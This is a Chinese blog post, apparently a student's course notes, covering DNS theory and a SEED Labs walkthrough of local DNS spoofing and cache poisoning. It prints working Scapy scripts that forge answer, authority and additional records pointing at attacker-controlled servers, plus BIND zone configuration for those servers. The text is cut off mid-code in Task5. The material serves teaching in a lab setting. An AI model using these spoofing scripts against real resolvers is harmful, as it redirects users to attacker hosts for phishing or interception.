@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="网络攻防-假消息攻击3-DNS攻击，涉及实验：SEED Labs – Local DNS Attack Lab + SEED Labs – Remote DNS Cache Poisoning Attack Lab，代码见：https:&#x2F;&#x2F;github.com&#x2F;Seanxz401&#x2F;seed-labs">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网络攻防-DNS攻击">
+<meta property="og:url" content="http://example.com/2022/12/31/university/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-DNS%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="Sean&#39;s Blog">
+<meta property="og:description" content="网络攻防-假消息攻击3-DNS攻击，涉及实验：SEED Labs – Local DNS Attack Lab + SEED Labs – Remote DNS Cache Poisoning Attack Lab，代码见：https:&#x2F;&#x2F;github.com&#x2F;Seanxz401&#x2F;seed-labs">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221231212728463.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221231220824455.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221231220848848.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221231220429307.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221206142149336.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221206142506326.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221206142749787.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221206143002936.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221206163905438.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221206164222997.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221206164407617.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221206170920668.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221206171014330.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221206172949819.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221206173146772.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221206182600141.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221210111532659.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221210225830708.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221210225025331.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221210224942160.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221210225235729.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221210225401775.png">
+<meta property="article:published_time" content="2022-12-31T14:34:51.000Z">
+<meta property="article:modified_time" content="2024-05-27T07:17:13.620Z">
+<meta property="article:author" content="Sean">
+<meta property="article:tag" content="网络安全 课程笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221231212728463.png">
+
+<link rel="canonical" href="http://example.com/2022/12/31/university/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-DNS%E6%94%BB%E5%87%BB/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>网络攻防-DNS攻击 | Sean's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Sean's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/31/university/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-DNS%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/banner.jpg">
+      <meta itemprop="name" content="Sean">
+      <meta itemprop="description" content="热爱可抵岁月漫长">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sean's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          网络攻防-DNS攻击
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-12-31 22:34:51" itemprop="dateCreated datePublished" datetime="2022-12-31T22:34:51+08:00">2022-12-31</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-05-27 15:17:13" itemprop="dateModified" datetime="2024-05-27T15:17:13+08:00">2024-05-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/university/" itemprop="url" rel="index"><span itemprop="name">university</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/university/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/" itemprop="url" rel="index"><span itemprop="name">网络攻防</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>网络攻防-假消息攻击3-DNS攻击，涉及实验：SEED Labs – Local DNS Attack Lab + SEED Labs – Remote DNS Cache Poisoning Attack Lab，代码见：<a target="_blank" rel="noopener" href="https://github.com/Seanxz401/seed-labs">https://github.com/Seanxz401/seed-labs</a></p>
+<span id="more"></span>
+
+<h1 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h1><p>DNS层次结构：</p>
+<ul>
+<li>根域名：有13个DNS根服务器</li>
+<li>顶级域TLD：<ul>
+<li>基础结构：arpa</li>
+<li>通用：.com .net</li>
+<li>赞助：.edu .gov .mail</li>
+<li>国家代码：.cn .us</li>
+<li>保留：.example .localhost</li>
+</ul>
+</li>
+<li>二级域名</li>
+</ul>
+<p>区域与域：？</p>
+<p>权威名称服务器：提供DNS查询的原始和最终答案(每个域中至少有一个)</p>
+<h2 id="DNS查询过程"><a href="#DNS查询过程" class="headerlink" title="DNS查询过程"></a>DNS查询过程</h2><p>&#x2F;etc&#x2F;hosts：存储某些主机名的IP地址。在计算机联系本地DNS服务器之前，它 首先在该文件中查找IP地址。</p>
+<p> &#x2F;etc&#x2F;resolv.conf：向计算机的DNS解析器提供有关本地DNS服务器地址的信息。 DHCP提供的本地DNS服务器的IP地址也存储在这里。</p>
+<p>迭代与递归混合查询过程：<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221231212728463.png" alt="image-20221231212728463"></p>
+<h2 id="DNS响应"><a href="#DNS响应" class="headerlink" title="DNS响应"></a>DNS响应</h2><ul>
+<li>问题部分：向名称服务器描述问题</li>
+<li>回答部分：回答问题的记录</li>
+<li>权威部分：指向权威名称服务器的记录</li>
+<li>附加部分：与查询相关的记录</li>
+</ul>
+<p>DNS缓存：当本地DNS服务器从其他DNS服务器获取信息时，它会缓存该信息。缓存中的每一条信息都有一个生存时间值，最终将超时并从缓存中删除</p>
+<h2 id="DNS数据包"><a href="#DNS数据包" class="headerlink" title="DNS数据包"></a>DNS数据包</h2><p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221231220824455.png" alt="image-20221231220824455"></p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221231220848848.png" alt="image-20221231220848848"></p>
+<h2 id="DNS攻击"><a href="#DNS攻击" class="headerlink" title="DNS攻击"></a>DNS攻击</h2><ul>
+<li>拒绝服务攻击：使本地DNS服务器和权威名称服务器无法响应DNS查询</li>
+<li>DNS欺骗：向受害者提供欺诈性IP地址，诱使他们与不同于他们意图的机器进行通信</li>
+<li>如果攻击者获得了机器的根权限，可以修改 &#x2F;etc&#x2F;resolv.conf和 &#x2F;etc&#x2F;hosts</li>
+<li>来自恶意DNS服务器的回复伪造攻击：恶意DNS Server在Authority Section和Additional Section中提供伪造数据</li>
+<li>反向DNS查找中的应答伪造：如果数据包来自攻击者，则反向DNS查找将返回到攻击者的名称服务器。 攻击者可以使用他们想要的任何主机名进行回复。</li>
+<li>DNS重新绑定攻击：可以绕过同源策略。<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/DNS%E9%87%8D%E6%96%B0%E7%BB%91%E5%AE%9A%E6%94%BB%E5%87%BB/23114197">DNS重新绑定攻击_百度百科 (baidu.com)</a></li>
+<li>DNS缓存中毒攻击：具体见下方</li>
+</ul>
+<p>本地DNS缓存中毒攻击：在看到来自本地DNS的查询后伪造DNS应答(Answer Section和Authority Section)</p>
+<p>远程DNS缓存中毒攻击：需要猜测查询数据包使用的两个随机数，源端口号和事务ID。如果一次尝试失败，local DNS 将缓存实际回复；攻击者需要等待缓存超时以进 行下一次尝试。</p>
+<h3 id="Kaminsky攻击"><a href="#Kaminsky攻击" class="headerlink" title="Kaminsky攻击"></a>Kaminsky攻击</h3><p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221231220429307.png" alt="image-20221231220429307"></p>
+<p>核心思想：查询一个不可能存在的域名，伪造Authority Section。这样查询的域名被缓存也没关系，主要的攻击点在于随机数命中后能修改受害者机器上的权威服务器。</p>
+<h3 id="防止DNS缓存中毒攻击"><a href="#防止DNS缓存中毒攻击" class="headerlink" title="防止DNS缓存中毒攻击"></a>防止DNS缓存中毒攻击</h3><ul>
+<li>DNSSEC：对DNS数据提供身份验证和完整性检查。（数字签名机制）</li>
+<li>TLS&#x2F;SSL：服务器必须提供由受信任实体签名的公钥证书，并证明它是证书的所有者。</li>
+</ul>
+<h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><h2 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h2><h3 id="环境测试"><a href="#环境测试" class="headerlink" title="环境测试"></a>环境测试</h3><p>local-dns-server(10.9.0.53)：<code>cat /etc/bind/named.conf</code>，得到attacker32.com会被映射到的IP为10.9.0.153(attacker-ns)<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221206142149336.png" alt="image-20221206142149336"></p>
+<p>user(10.9.0.5)：<code>dig ns.attacker32.com</code>，得到配置文件中对应的IP结果<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221206142506326.png" alt="image-20221206142506326"></p>
+<p>查询<a href="http://www.example.com的IP：">www.example.com的IP：</a></p>
+<ol>
+<li><code>dig www.example.com</code>：local-dns-server做出响应，没有查询到IP。但它会将请求发送到对应的官方nameserver<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221206142749787.png" alt="image-20221206142749787"></li>
+<li><code>dig @ns.attacker32.com www.example.com</code>：attacker-ns做出响应，返回该域名对应的虚假IP为<code>1.2.3.5</code>。<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221206143002936.png" alt="image-20221206143002936"></li>
+</ol>
+<h3 id="Task1-构造DNS响应包"><a href="#Task1-构造DNS响应包" class="headerlink" title="Task1 构造DNS响应包"></a>Task1 构造DNS响应包</h3><p>清除local-dns-server上的缓存：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rndc dumpdb -cache	<span class="comment"># 保存到文件 /var/cache/bind/dump.db</span></span><br><span class="line">rndc flush			<span class="comment"># 清空</span></span><br></pre></td></tr></table></figure>
+
+<p>在seed-attacker创建攻击代码spoof_user.py，构造DNS响应包，只能攻击用户</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_user</span>(<span class="params">pkt</span>):</span><br><span class="line">	<span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;example.com&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):<span class="comment"># 判断是否为查询example.com的DNS请求</span></span><br><span class="line">		ip  = IP  (dst = pkt[IP].src, src = pkt[IP].dst)</span><br><span class="line">		udp = UDP (dport = pkt[UDP].sport, sport = <span class="number">53</span>)</span><br><span class="line">		<span class="comment"># 构造ANSWER SECTION</span></span><br><span class="line">		Anssec = DNSRR( rrname = pkt[DNS].qd.qname, </span><br><span class="line">		                <span class="built_in">type</span>   = <span class="string">&#x27;A&#x27;</span>, </span><br><span class="line">		                rdata  = <span class="string">&#x27;1.2.3.1&#x27;</span>,</span><br><span class="line">		                ttl    = <span class="number">259200</span>)</span><br><span class="line">		<span class="comment"># DNS报文字段解析参照：	</span></span><br><span class="line">        <span class="comment"># https://blog.51cto.com/yyxianren/5721157</span></span><br><span class="line">		dns = DNS( <span class="built_in">id</span> = pkt[DNS].<span class="built_in">id</span>, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,</span><br><span class="line">		           qdcount=<span class="number">1</span>, qd = pkt[DNS].qd,</span><br><span class="line">		           ancount=<span class="number">1</span>, an = Anssec)</span><br><span class="line">		spoofpkt = ip/udp/dns</span><br><span class="line">		send(spoofpkt)</span><br><span class="line"><span class="comment"># 监听是否有主机向local-dns-server发起dns请求</span></span><br><span class="line">f = <span class="string">&#x27;udp and (dst host 10.9.0.53 and dst port 53)&#x27;</span></span><br><span class="line">pkt=sniff(iface=<span class="string">&#x27;br-c0f5a7acfbe9&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_user)</span><br></pre></td></tr></table></figure>
+
+<p>user使用<code>dig www.example.com</code>得到构造的IP 1.2.3.1：<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221206163905438.png" alt="image-20221206163905438"></p>
+<h3 id="Task2-DNS投毒"><a href="#Task2-DNS投毒" class="headerlink" title="Task2 DNS投毒"></a>Task2 DNS投毒</h3><p>清除local-dns-server的dns缓存，构造攻击代码spoof_ns.py，当DNS服务器向上层发起请求时，进行伪装应答。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line">	<span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;example.com&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):<span class="comment"># 判断是否为查询example.com的DNS请求</span></span><br><span class="line">        ip  = IP  (dst = pkt[IP].src, src = pkt[IP].dst)</span><br><span class="line">        udp = UDP (dport = pkt[UDP].sport, sport = <span class="number">53</span>)</span><br><span class="line">        <span class="comment"># 构造ANSWER SECTION</span></span><br><span class="line">        Anssec = DNSRR( rrname = pkt[DNS].qd.qname, </span><br><span class="line">                        <span class="built_in">type</span>   = <span class="string">&#x27;A&#x27;</span>, </span><br><span class="line">                        rdata  = <span class="string">&#x27;1.2.3.2&#x27;</span>,</span><br><span class="line">                        ttl    = <span class="number">259200</span>)</span><br><span class="line">        dns = DNS( <span class="built_in">id</span> = pkt[DNS].<span class="built_in">id</span>, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,       </span><br><span class="line">                   qdcount=<span class="number">1</span>, qd = pkt[DNS].qd,</span><br><span class="line">                   ancount=<span class="number">1</span>, an = Anssec)</span><br><span class="line">        spoofpkt = ip/udp/dns</span><br><span class="line">        send(spoofpkt)</span><br><span class="line"><span class="comment"># 监听local-dns-server向上级dns服务器发起的请求包</span></span><br><span class="line">f = <span class="string">&#x27;udp and (src host 10.9.0.53 and dst port 53)&#x27;</span></span><br><span class="line">pkt=sniff(iface=<span class="string">&#x27;br-c0f5a7acfbe9&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns)</span><br></pre></td></tr></table></figure>
+
+<p>user使用<code>dig www.example.com</code>得到构造的IP 1.2.3.2：<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221206164222997.png" alt="image-20221206164222997"></p>
+<p>停止spoof_ns.py攻击代码，user再次发起请求，结果还是1.2.3.2，说明local-dns-server的缓存区已经被污染。将缓存保存到文件<code>rndc dumpdb -cache</code>，查看文件<code>cat /var/cache/bind/dump.db</code>可以看到该域名对应的虚假IP 1.2.3.2已经被存储到缓存文件了。<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221206164407617.png" alt="image-20221206164407617"></p>
+<h3 id="Task3-构造虚假权威服务器"><a href="#Task3-构造虚假权威服务器" class="headerlink" title="Task3 构造虚假权威服务器"></a>Task3 构造虚假权威服务器</h3><p>清除local-dns-server的dns缓存，构造攻击代码spoof_auth.py，当DNS服务器向上层发起请求时，进行伪装应答，同时返回虚假的权威服务器ns.attacker32.com。与Task2相比，添加了权威服务器的部分内容：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造nameserver服务器相关信息</span></span><br><span class="line">NSsec  = DNSRR( rrname = <span class="string">&#x27;example.com&#x27;</span>, </span><br><span class="line">                <span class="built_in">type</span>   = <span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                rdata  = <span class="string">&#x27;ns.attacker32.com&#x27;</span>,</span><br><span class="line">                ttl    = <span class="number">259200</span>)</span><br><span class="line">dns = DNS( <span class="built_in">id</span> = pkt[DNS].<span class="built_in">id</span>, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,           </span><br><span class="line">            qdcount=<span class="number">1</span>, qd = pkt[DNS].qd,                 </span><br><span class="line">            ancount=<span class="number">1</span>, an = Anssec, </span><br><span class="line">            nscount=<span class="number">1</span>, ns = NSsec)</span><br></pre></td></tr></table></figure>
+
+<p>返回的ANSWER SECTION与构造的Anssec无关，而是ns.attacker32.com攻击dns服务器上的结果：1.2.3.5<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221206170920668.png" alt="image-20221206170920668"></p>
+<p>在ns.attacker32.com攻击dns服务器上查看域名example.comd的处理机制<code>cat /etc/bind/zone_example.com</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@       IN      A     1.2.3.4</span><br><span class="line">www     IN      A     1.2.3.5</span><br><span class="line">ns      IN      A     10.9.0.153</span><br><span class="line">*       IN      A     1.2.3.6	# 除上述之外其他情况</span><br></pre></td></tr></table></figure>
+
+<p>user随意拼接一个example.com的子域名进行查询：sean.example.com，得到配置文件中的1.2.3.6<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221206171014330.png" alt="image-20221206171014330"></p>
+<h3 id="Task4-添加其他域名的权威服务器"><a href="#Task4-添加其他域名的权威服务器" class="headerlink" title="Task4 添加其他域名的权威服务器"></a>Task4 添加其他域名的权威服务器</h3><p>清除dns缓存，攻击代码spoof_auth1.py相较于Task3，再增加一栏NS</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">NSsec  = DNSRR( rrname = <span class="string">&#x27;example.com&#x27;</span>, </span><br><span class="line">                <span class="built_in">type</span>   = <span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                rdata  = <span class="string">&#x27;ns.attacker32.com&#x27;</span>,</span><br><span class="line">                ttl    = <span class="number">259200</span>)</span><br><span class="line">NSsec1 = DNSRR( rrname = <span class="string">&#x27;google.com&#x27;</span>, </span><br><span class="line">                <span class="built_in">type</span>   = <span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                rdata  = <span class="string">&#x27;ns.attacker32.com&#x27;</span>,</span><br><span class="line">                ttl    = <span class="number">259200</span>)             </span><br><span class="line">dns = DNS( <span class="built_in">id</span> = pkt[DNS].<span class="built_in">id</span>, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,           </span><br><span class="line">            qdcount=<span class="number">1</span>, qd = pkt[DNS].qd,                 </span><br><span class="line">            ancount=<span class="number">1</span>, an = Anssec, </span><br><span class="line">            nscount=<span class="number">2</span>, ns = NSsec1/NSsec)</span><br></pre></td></tr></table></figure>
+
+<p>user查询<a target="_blank" rel="noopener" href="http://www.example.com结果为anssec中构造的ip/">www.example.com结果为Anssec中构造的IP</a> 1.2.3.4<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221206172949819.png" alt="image-20221206172949819"></p>
+<p>查看dns缓存，google.com域名的权威服务器被改为攻击dns服务器了，即<strong>DNS欺骗包只保留了第一条NSsec</strong>：<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221206173146772.png" alt="image-20221206173146772"></p>
+<p>修改ns.attacker32.com中的named.conf，加入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zone &quot;google.com&quot; &#123;</span><br><span class="line">        type master;</span><br><span class="line">        file &quot;/etc/bind/zone_google.com&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>复制zone_example.com为zone_google.com(主要是参考他的格式)，添加一行以便查看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sean	IN	A	6.6.6.6</span><br></pre></td></tr></table></figure>
+
+<p>ns.attacker32.com<strong>重启DNS服务</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service named restart</span><br></pre></td></tr></table></figure>
+
+<p>user查询sean.google.com得到6.6.6.6：<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221206182600141.png" alt="image-20221206182600141"></p>
+<h3 id="Task5-Additional-Section"><a href="#Task5-Additional-Section" class="headerlink" title="Task5 Additional Section"></a>Task5 Additional Section</h3><p>清除缓存，构造攻击代码spoof_add.py，在Task4的基础上添加对Additional Section的构造：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Addsec = DNSRR(rrname = <span class="string">&#x27;ns.attacker32.com&#x27;</span>,</span><br><span class="line">                <span class="built_in">type</span> = <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                rdata = <span class="string">&#x27;1.2.3.51&#x27;</span>,</span><br><span class="line">                ttl = <span class="number">259200</span>) </span><br><span class="line">Addsec1 = DNSRR(rrname = <span class="string">&#x27;ns.example.com&#x27;</span>,</span><br><span class="line">                <span class="built_in">type</span> = <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                rdata = <span class="string">&#x27;10.9.0.153&#x27;</span>,</span><br><span class="line">                ttl = <span class="number">259200</span>) </span><br><span class="line">Addsec2 = DNSRR(rrname = <span class="string">&#x27;xz.google.com&#x27;</span>,</span><br><span class="line">    